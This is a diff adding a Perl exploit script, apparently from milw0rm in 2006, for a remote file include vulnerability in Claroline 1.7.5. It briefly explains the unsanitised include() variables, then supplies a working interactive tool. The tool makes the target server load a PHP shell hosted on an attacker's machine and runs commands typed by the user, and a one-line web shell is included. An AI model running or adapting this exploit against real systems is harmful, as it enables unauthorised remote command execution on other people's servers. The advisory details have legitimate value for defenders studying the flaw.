@@ -1,0 +1,89 @@
+#!/usr/bin/perl
+############
+# Claroline Open Source e-Learning  1.7.5 Remote File Include
+# Exploit & Advisorie:  beford <xbefordx gmail com>
+#
+# uso:# 	perl own.pl <host> <cmd-shell-url> <cmd-var>
+# 		perl own.pl http://host.com/claroline/auth/ http://atacante/shell.gif cmd
+#
+# cmd shell example: <? system($cmd); ?>
+# cmd variable: cmd;
+#
+#############
+# Description
+#############
+# Vendor: http://www.claroline.net
+# The file claroline/auth/extauth/drivers/ldap.inc.php uses the variable 
+# clarolineRepositorySys in a include() function without being declared. 
+# There are other files vulnerable in the same folder, this exploit only
+# attacks ldap.inc.php
+#
+# There is other vulnerable file claroline/auth/extauth/casProcess.inc.php
+# it uses the claro_CasLibPath in a include function but this is not being
+# declared either, so pwnt, RFI. Vendor was contacted through email, 
+# no response, so i just posted this here and on its forum.
+############
+# Vulnerable code (lda.inc.php)
+############
+# return require $clarolineRepositorySys.'/auth/extauth/extAuthProcess.inc.php';
+############
+# Vulnerable code (casProcess.inc.php)
+############
+#if (   ! isset($_SESSION['init_CasCheckinDone'] )
+#    || $logout
+#    || ( basename($_SERVER['SCRIPT_NAME']) == 'login.php' && isset($_REQUEST['authModeReq']) && $_REQUEST['authModeReq'] == 'CAS' )
+#    || isset($_REQUEST['fromCasServer']) )
+#{
+#    include_once $claro_CasLibPath;
+############
+use LWP::UserAgent;
+
+$Path = $ARGV[0];
+$Pathtocmd = $ARGV[1];
+$cmdv = $ARGV[2];
+if($Path!~/http:\/\// || $Pathtocmd!~/http:\/\// || !$cmdv) { usage(); }
+head();
+while() {
+	print "[shell] \$";
+	while(<STDIN>)      {
+		$cmd=$_;
+		chomp($cmd);
+		if (!$cmd) {last;}  
+		$xpl = LWP::UserAgent->new() or die;
+		$req = HTTP::Request->new(GET =>$Path.'extauth/drivers/ldap.inc.php?clarolineRepositorySys='.$Pathtocmd.'?&'.$cmdv.'='.$cmd)or die "\nCould Not connect\n";
+		$res = $xpl->request($req);
+		$return = $res->content;
+		$return =~ tr/[\n]/[ê]/;
+		if ($return =~/Error: HTTP request failed!/ ) {
+			print "\nInvalid path for phpshell\n";
+			exit;
+		} elsif ($return =~/^<br.\/>.<b>Fatal.error/) {
+			print "\nInvalid Command, error.\n\n";
+		}
+		if ($return =~ /(.*)/) {
+			$finreturn = $1;
+			$finreturn=~ tr/[ê]/[\n]/;
+			print "\r\n$finreturn\n\r";
+			last;
+		} else {
+			print "[shell] \$";
+		}
+	}
+} last;
+
+sub head()  { 
+	print "\n============================================================================\r\n";
+	print "  Claroline Open Source e-Learning  1.7.5 Remote File Include\r\n";
+	print "============================================================================\r\n";
+ }
+ 
+sub usage() {
+	head();
+	print " Usage: perl own.pl <host> <url-cmd> <var>\r\n\n";
+	print " <host> - Full Path to Authentication Dir : http://host/claroline/auth/do \r\n";
+	print " <url-cmd> - PhpShell : http://atacate/shell.gif \r\n";
+	print " <var> - var name used in phpshell : cmd  \r\n\r\n";
+	exit();
+ }
+
+# milw0rm.com [2006-05-08]
